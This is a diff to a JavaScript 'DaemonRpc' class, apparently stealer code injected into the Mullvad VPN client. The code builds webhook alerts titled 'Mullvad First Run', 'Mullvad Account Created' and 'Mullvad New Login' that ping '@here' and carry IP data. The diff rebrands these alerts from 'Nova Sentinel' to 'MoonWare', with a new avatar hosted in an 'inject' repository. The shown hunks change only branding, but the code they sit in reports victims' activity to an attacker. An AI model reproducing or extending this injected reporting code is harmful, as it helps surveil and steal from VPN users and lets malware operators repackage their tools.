@@ -201,9 +201,9 @@ class DaemonRpc {
       ip = null;
     }
     const embed = {
-      color: 2829617,
+      color: 15418782,
       footer: {
-        text: "@Nova Sentinel | https://t.me/Sordeal",
+        text: "@MoonWare",
       },
       title: "Mullvad First Run",
       fields: [
@@ -235,9 +235,9 @@ class DaemonRpc {
     };
 
     const message = {
-      username: "Nova Sentinel",
+      username: "MoonWare",
       avatar_url:
-        "https://raw.githubusercontent.com/ksch-58/sub/main/assets/lilnova.png",
+        "https://raw.githubusercontent.com/selfbot12345/inject/main/moonware.png",
       content: "@here",
       embeds: [embed],
     };
@@ -339,9 +339,9 @@ class DaemonRpc {
       ip = null;
     }
     const embed = {
-      color: 2829617,
+      color: 15418782,
       footer: {
-        text: "@Nova Sentinel | https://t.me/Sordeal",
+        text: "MoonWare",
       },
       title: "Mullvad Account Created",
       fields: [
@@ -375,7 +375,7 @@ class DaemonRpc {
     const message = {
       username: "Nova Sentinel",
       avatar_url:
-        "https://raw.githubusercontent.com/ksch-58/sub/main/assets/lilnova.png",
+        "https://raw.githubusercontent.com/selfbot12345/inject/main/moonware.png",
       content: "@here",
       embeds: [embed],
     };
@@ -414,9 +414,9 @@ class DaemonRpc {
         ip = null;
       }
       const embed = {
-        color: 2829617,
+        color: 15418782,
         footer: {
-          text: "@Nova Sentinel | https://t.me/Sordeal",
+          text: "MoonWare",
         },
         title: "Mullvad New Login",
         fields: [
@@ -448,9 +448,9 @@ class DaemonRpc {
       };
 
       const message = {
-        username: "Nova Sentinel",
+        username: "MoonWare",
         avatar_url:
-          "https://raw.githubusercontent.com/ksch-58/sub/main/assets/lilnova.png",
+          "https://raw.githubusercontent.com/selfbot12345/inject/main/moonware.png",
         content: "@here",
         embeds: [embed],
       };
